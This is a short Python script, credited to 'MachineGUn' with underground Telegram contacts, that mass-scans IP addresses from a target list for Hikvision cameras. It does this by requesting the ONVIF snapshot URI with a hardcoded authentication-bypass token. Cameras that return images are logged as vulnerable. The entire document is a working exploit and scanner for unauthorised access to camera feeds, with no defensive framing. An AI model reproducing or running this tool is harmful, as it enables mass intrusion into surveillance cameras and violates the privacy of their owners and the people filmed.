#Coded By MachineGUn 
#Contact : undergroundcy.t.me | uz3er.t.me | zerodey.ir 
#CHeck For Vulnerable Hikvision to This URI #> /onvif-http/snapshot?auth=YWRtaW46MTEK
##############
import requests
import time
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore as color
##############
user_agent = UserAgent() 
random_user_agent = user_agent.random

vulnerable_targets = []
timeout_request = 12

def check_target(ip):
    ip = ip.strip()
    url = "http://"+ip+"/onvif-http/snapshot?auth=YWRtaW46MTEK"
    try:
        result = requests.get(url, timeout=timeout_request)
        if (result.status_code == 200):
            content_length = result.headers.get("Content-Length")
            if (int(content_length) > 100):
                print(color.GREEN+"Target is Vulnerable#> "+url+"\n"+color.WHITE)
                vulnerable_targets.append(url)
                return url
        else:
            print(color.RED+"No #> \n"+url+color.WHITE)
    except:
        print(color.RED+"No #> "+url+"\n"+color.WHITE)
    else:
        print(color.RED+"No #> \n"+url+"\n"+color.WHITE)
#Read The Possible Vulerable Ips
with open("targets.txt", "r+") as target:
    possible_vulnerable_ips = target.readlines()
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(check_target, possible_vulnerable_ips)

    #for check in possible_vulnerable_ips:
    #    check_target(check)

with open("vulnerable.txt", "a+") as vul:
    vul.write(" ")
    for vulnerable in vulnerable_targets:
        vul.write(vulnerable)
        vul.write("\n")


